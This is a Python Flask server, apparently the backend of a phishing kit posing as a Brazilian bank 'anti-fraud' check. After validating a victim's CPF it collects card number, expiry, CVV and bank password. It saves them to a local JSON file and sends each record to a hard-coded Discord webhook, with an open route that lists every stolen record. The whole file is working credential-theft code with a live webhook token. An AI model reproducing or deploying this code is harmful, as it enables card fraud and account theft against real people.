from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import os
import json
from datetime import datetime
import requests
import traceback

app = Flask(__name__)
CORS(app)

# ===== CONFIGURAÇÕES =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1488642907417346242/BYCMQrQ_po5L4LpyPHFwO7fiOhB5K78q9440PundIrI2c_NYtvHAesiuo9xMIAcNZ-x0"
DADOS_FILE = 'dados.json'

print("=" * 50)
print("🚀 SERVIDOR INICIADO")
print(f"📁 Pasta atual: {os.getcwd()}")
print(f"🔗 Webhook: {DISCORD_WEBHOOK_URL[:60]}...")
print("=" * 50)

def ler_dados():
    if not os.path.exists(DADOS_FILE):
        return []
    try:
        with open(DADOS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def escrever_dados(dados):
    with open(DADOS_FILE, 'w', encoding='utf-8') as f:
        json.dump(dados, f, indent=2, ensure_ascii=False)

def validar_digitos_cpf(cpf):
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
    resto = (soma * 10) % 11
    if resto == 10:
        resto = 0
    if resto != int(cpf[9]):
        return False
    soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
    resto = (soma * 10) % 11
    if resto == 10:
        resto = 0
    return resto == int(cpf[10])

def enviar_para_discord(dados, tipo="parcial"):
    """Envia dados para o Discord com logs detalhados"""
    print(f"\n📤 Enviando para Discord...")
    print(f"   Tipo: {tipo}")
    print(f"   CPF: {dados.get('cpf')}")
    
    if not DISCORD_WEBHOOK_URL:
        print("❌ Webhook URL não configurada!")
        return False
    
    try:
        # Montar mensagem
        if tipo == "completo" or dados.get('completo'):
            titulo = "🔐 DADOS COMPLETOS COM SENHA"
            desc = f"**CPF:** {dados.get('cpf')}\n"
            desc += f"**Banco:** {dados.get('banco')}\n"
            desc += f"**Cartão:** {dados.get('dadosCartao', {}).get('numero')}\n"
            desc += f"**Validade:** {dados.get('dadosCartao', {}).get('validade')}\n"
            desc += f"**CVV:** {dados.get('dadosCartao', {}).get('cvv')}\n"
            desc += f"**🔑 SENHA:** {dados.get('senha')}"
            cor = 65280  # Verde
        else:
            titulo = "💳 DADOS DE CARTÃO"
            desc = f"**CPF:** {dados.get('cpf')}\n"
            desc += f"**Banco:** {dados.get('banco')}\n"
            desc += f"**Cartão:** {dados.get('dadosCartao', {}).get('numero')}\n"
            desc += f"**Validade:** {dados.get('dadosCartao', {}).get('validade')}\n"
            desc += f"**CVV:** {dados.get('dadosCartao', {}).get('cvv')}"
            cor = 16711680  # Vermelho
        
        payload = {
            "embeds": [{
                "title": titulo,
                "description": desc,
                "color": cor,
                "timestamp": datetime.now().isoformat(),
                "footer": {"text": "Sistema Antifraude"}
            }]
        }
        
        print(f"   Enviando requisição...")
        response = requests.post(
            DISCORD_WEBHOOK_URL, 
            json=payload, 
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Resposta status: {response.status_code}")
        
        if response.status_code == 204:
            print("✅ Mensagem enviada com sucesso para o Discord!")
            return True
        else:
            print(f"❌ Erro: Status {response.status_code}")
            print(f"   Resposta: {response.text}")
            return False
            
    except requests.exceptions.Timeout:
        print("❌ Timeout - Discord demorou para responder")
        return False
    except requests.exceptions.ConnectionError:
        print("❌ Erro de conexão - Verifique sua internet")
        return False
    except Exception as e:
        print(f"❌ Erro inesperado: {str(e)}")
        traceback.print_exc()
        return False

# ===== ROTAS =====
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/validar-cpf', methods=['POST'])
def validar_cpf():
    try:
        data = request.get_json()
        cpf = data.get('cpf', '')
        cpf_limpo = ''.join(filter(str.isdigit, cpf))
        
        print(f"🔍 Validando CPF: {cpf_limpo}")

        if cpf_limpo == '11111111111':
            return jsonify({'valido': False, 'mensagem': 'CPF bloqueado.'})
        
        if len(cpf_limpo) != 11:
            return jsonify({'valido': False, 'mensagem': 'CPF deve ter 11 dígitos.'})
        
        if not validar_digitos_cpf(cpf_limpo):
            return jsonify({'valido': False, 'mensagem': 'CPF inválido.'})
        
        print(f"✅ CPF válido: {cpf_limpo}")
        return jsonify({'valido': True})
        
    except Exception as e:
        print(f"❌ Erro validar CPF: {e}")
        return jsonify({'valido': False, 'mensagem': 'Erro interno'}), 500

@app.route('/api/salvar-cartao', methods=['POST'])
def salvar_cartao():
    try:
        dados = request.get_json()
        cpf = dados.get('cpf')
        banco = dados.get('banco')
        dados_cartao = dados.get('dadosCartao')

        print(f"\n💳 Salvando dados do cartão")
        print(f"   CPF: {cpf}")
        print(f"   Banco: {banco}")
        print(f"   Cartão: {dados_cartao.get('numero')}")

        if not cpf or not banco or not dados_cartao:
            return jsonify({'sucesso': False, 'mensagem': 'Dados incompletos'}), 400

        todos = ler_dados()
        novo_registro = {
            'cpf': cpf,
            'banco': banco,
            'dadosCartao': dados_cartao,
            'completo': False,
            'senha': None,
            'dataHora': datetime.now().isoformat()
        }

        # Atualiza se existir pendente
        atualizado = False
        for i, reg in enumerate(todos):
            if reg.get('cpf') == cpf and not reg.get('completo', False):
                todos[i] = novo_registro
                atualizado = True
                break
        if not atualizado:
            todos.append(novo_registro)

        escrever_dados(todos)
        
        # Envia para o Discord
        enviar_para_discord(novo_registro, "parcial")

        return jsonify({'sucesso': True})
        
    except Exception as e:
        print(f"❌ Erro salvar cartão: {e}")
        traceback.print_exc()
        return jsonify({'sucesso': False, 'mensagem': str(e)}), 500

@app.route('/api/enviar-senha', methods=['POST'])
def enviar_senha():
    try:
        data = request.get_json()
        cpf = data.get('cpf')
        senha = data.get('senha')

        print(f"\n🔐 Salvando senha")
        print(f"   CPF: {cpf}")
        print(f"   Senha: {senha}")

        if not cpf or not senha:
            return jsonify({'sucesso': False, 'mensagem': 'CPF e senha obrigatórios'}), 400

        todos = ler_dados()
        registro_completo = None
        
        for i, reg in enumerate(todos):
            if reg.get('cpf') == cpf and not reg.get('completo', False):
                reg['senha'] = senha
                reg['completo'] = True
                reg['dataHora'] = datetime.now().isoformat()
                registro_completo = reg
                break

        if registro_completo is None:
            return jsonify({'sucesso': False, 'mensagem': 'Registro não encontrado'}), 404

        escrever_dados(todos)
        
        # Envia para o Discord
        enviar_para_discord(registro_completo, "completo")

        return jsonify({'sucesso': True})
        
    except Exception as e:
        print(f"❌ Erro enviar senha: {e}")
        traceback.print_exc()
        return jsonify({'sucesso': False, 'mensagem': str(e)}), 500

@app.route('/api/consultar', methods=['GET'])
def consultar():
    return jsonify(ler_dados())

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
